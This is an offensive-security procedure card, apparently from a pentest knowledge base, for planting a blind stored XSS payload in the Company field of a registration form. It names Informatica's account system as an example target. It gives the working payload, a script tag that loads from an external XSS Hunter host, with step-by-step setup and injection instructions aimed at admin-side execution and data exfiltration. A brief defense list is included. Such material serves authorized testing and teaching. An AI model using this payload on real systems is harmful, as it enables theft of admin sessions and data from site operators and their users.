---
tags:
  - xss-injection
  - payload
type: procedure
tools:
  - '[[tools/xsshunter]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:29:20.218Z'
sub_techniques: []
id: c3710ad1-7563-486f-a49c-72e4a5aa2138
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Blind-XSS-Payload-in-Company-Field

## Summary

This procedure injects a blind XSS payload into the unsanitized Company field during registration, leveraging improper HTML sanitization to store executable JavaScript for later admin-side execution.

## Description

Targeted at web applications like Informatica's account system, this step exploits the lack of input validation in the Company field. The payload `"><script src=https://monty.xss.ht></script>` closes HTML tags and loads an external script from an XSS monitoring service. It requires prior access to the registration form and a configured hunter URL. Outcomes include payload persistence in the user record, triggering upon admin view for data exfiltration.

## Requirements

1. Active session on the registration form
2. Configured XSS Hunter account with a unique domain like monty.xss.ht
3. Knowledge of HTML/JS payload crafting

## Defense

Defensive measures and detection strategies:

- Sanitize all user inputs with HTML entity encoding or libraries like DOMPurify
- Implement Content Security Policy (CSP) to block external script sources
- Log and alert on suspicious input patterns in form submissions

## Objectives

1. Embed malicious JavaScript in stored data
2. Ensure blind execution without immediate feedback
3. Target admin context for privilege escalation

## Instructions

### Step 1: Prepare Payload

**Context**: Generate or customize the blind XSS payload using the monitoring service.

**Instructions**: Log into xsshunter.com, create a new hunt, and obtain the script source URL (e.g., https://monty.xss.ht). Construct the payload as `"><script src=https://monty.xss.ht></script>`.

> Manual preparation. Expected output: Valid payload string ready for injection.

### Step 2: Insert Payload in Form

**Context**: Place the payload in the vulnerable Company field to bypass sanitization.

**Instructions**: In the Company input, paste the full payload. Ensure no additional quotes or tags interfere.

> Form input action. Expected output: Field accepts the payload without truncation or errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/xsshunter]]

## Tags

- [[xss-injection]]
- [[payload]]
